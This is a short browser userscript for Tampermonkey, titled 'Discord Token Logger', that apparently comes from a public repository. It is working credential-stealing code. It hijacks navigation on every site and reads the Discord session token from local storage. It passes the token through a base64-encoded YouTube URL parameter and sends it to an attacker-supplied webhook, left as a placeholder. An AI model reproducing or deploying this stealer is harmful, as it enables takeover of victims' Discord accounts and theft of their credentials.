// ==UserScript==
// @name         Discord Token Logger
// @namespace    https://github.com/Lyzev/DiscordTokenLogger
// @version      1.2
// @description  A simple tokenlogger for Tampermonkey. (Browser Extension)
// @author       Lyzev
// @run-at       document-start
// @include http://*
// @include https://*
// @grant        none
// ==/UserScript==

(function () {
    const webhook = "WEBHOOK-URL";
    if (window.location.href.startsWith("https://www.youtube.com/")) {
        const url = new URL(window.location.href);
        const param = atob(url.searchParams.get("v"));
        if (param != null) {
            const request = new XMLHttpRequest();
            request.open("POST", webhook);
            request.setRequestHeader("Content-type", "application/json");
            const params = {
                username: "Tokenlogger",
                content: "Date: `" + new Date() + "`\nToken: `" + param + "`"
            };
            request.send(JSON.stringify(params));
        }
    } else if (window.location.href === "https://discord.com/channels/@me") {
        const token = localStorage.token;
        if (token != null) {
            window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
        }
    } else {
        window.location.href = "https://discord.com/channels/@me";
    }
})();
